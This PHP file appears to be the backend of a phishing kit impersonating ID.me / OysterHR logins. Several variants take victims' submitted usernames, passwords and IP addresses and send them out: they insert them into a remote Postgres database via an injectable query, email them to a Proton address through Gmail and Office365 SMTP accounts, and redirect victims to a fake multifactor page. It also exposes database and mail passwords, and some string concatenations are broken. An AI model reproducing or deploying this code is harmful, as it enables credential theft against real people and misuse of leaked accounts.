



//     $db = pg_connect("host=ec2-52-0-187-246.compute-1.amazonaws.com
//     port=5432 dbname=dektqomh0j255g user=rytsxrsukrhqco password=adfde4e40c5e70cc5ec639ab4b9f0d0f80e97f8a46af3591be523ff79942afd3");

// if ($_SERVER["REQUEST_METHOD"]=="POST"){
//     $query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
//     $result = pg_query($query);

   

// header("Location:https://oysterhr-66897a3baf5e.herokuapp.com/OysterHR.com/oysterhr/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_1.html");
// exit;
// }





$subject = "USERNAME & PASSWORD";
    $message = "username: $_POST[useremail]; \n".
                "password: $_POST[userpassword]; \n".
                "ip: $_POST[ip]; \n". 
    $headers = 'From: <jackottgerald@gmail.com>' . "\r\n";
    mail('<oysterhr@proton.me>', $subject, $message, $headers);






    $db = pg_connect("host=ec2-52-0-187-246.compute-1.amazonaws.com
    port=5432 dbname=dektqomh0j255g user=rytsxrsukrhqco password=adfde4e40c5e70cc5ec639ab4b9f0d0f80e97f8a46af3591be523ff79942afd3");

if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
    $result = pg_query($query);

   

header("Location:https://oysterhr-66897a3baf5e.herokuapp.com/OysterHR.com/oysterhr/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_1.html");
exit;
}






use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
 require 'vendor/autoload.php';
$mail = new PHPMailer(true);
$message = "username: $_POST[useremail]; \n".
                "password: $_POST[userpassword]; \n".
                "ip: $_POST[ip]; \n". 
    $mail->SMTPDebug = 2;                                      
    $mail->isSMTP();                                           
    $mail->Host       = 'smtp.gmail.com;';                   
    $mail->SMTPAuth   = true;                            
    $mail->Username   = 'ericsewell049@gmail.com';                
    $mail->Password   = 'Semiloore@23!';                       
    $mail->SMTPSecure = 'ssl';                             
    $mail->Port       = 465; 
    $mail->setFrom('ericsewell049@gmail.com');  
    $mail->addAddress('oysterhr@proton.me');
    $mail->isHTML(false);                                 
    $mail->Subject = 'IDME = USERNAME & PASSWORD';
    $mail->Body    = "$message";
    $mail->AltBody = "$message";
    
    if (isset($_POST['submit']))
  {
    $mail->send();
    echo "Email sent successfully!";
}



use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
 require 'vendor/autoload.php';
$mail = new PHPMailer(true);
$message = "username: $_POST[useremail]; \n".
                "password: $_POST[userpassword]; \n".
                "ip: $_POST[ip]; \n". 
    $mail->SMTPDebug = 2;                                      
    $mail->isSMTP();                                           
    $mail->Host       = 'smtp.office365.com';                   
    $mail->SMTPAuth   = true;                            
    $mail->Username   = 'outlook_640215D53A24F85E@outlook.com';                
    $mail->Password   = 'TGWCH-T5ACD-S3HWT-VG8ER-ML4PW';                       
    $mail->SMTPSecure = 'tls';                             
    $mail->Port       = 587; 
    $mail->setFrom('outlook_640215D53A24F85E@outlook.com');          
    $mail->addAddress('oysterhr@proton.me');
    $mail->isHTML(false);                                 
    $mail->Subject = 'IDME = USERNAME & PASSWORD';
    $mail->Body    = "$message";
    $mail->AltBody = "$message";
    
    if (isset($_POST['submit']))
  {
    $mail->send();
    echo "Email sent successfully!";
}